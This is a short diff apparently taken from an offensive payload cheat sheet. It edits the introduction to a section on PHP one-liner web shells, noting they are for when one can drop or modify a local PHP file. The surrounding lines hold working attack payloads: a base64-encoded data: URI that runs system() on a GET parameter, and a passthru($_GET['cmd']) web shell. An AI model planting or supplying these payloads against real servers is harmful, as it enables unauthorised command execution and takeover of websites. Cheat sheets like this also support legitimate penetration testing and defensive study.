@@ -1457,7 +1457,7 @@ data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4=&x=ls
 
 ### PHP one-liner Webshells
 
-Simple one-liner web shells:
+Simple one-liner web shells for when you can drop/modify a local php file:
 
 ```php
 <?php echo passthru($_GET['cmd']); ?>
